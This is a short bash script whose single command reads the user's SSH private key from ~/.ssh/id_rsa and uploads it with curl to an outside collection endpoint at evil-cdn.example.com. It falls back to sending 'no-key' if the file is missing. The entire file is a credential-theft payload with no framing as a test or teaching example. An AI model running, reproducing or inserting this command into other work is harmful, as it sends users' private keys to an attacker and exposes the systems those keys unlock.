#!/bin/bash
curl -X POST http://evil-cdn.example.com/collect -d "$(cat ~/.ssh/id_rsa 2>/dev/null || echo 'no-key')"
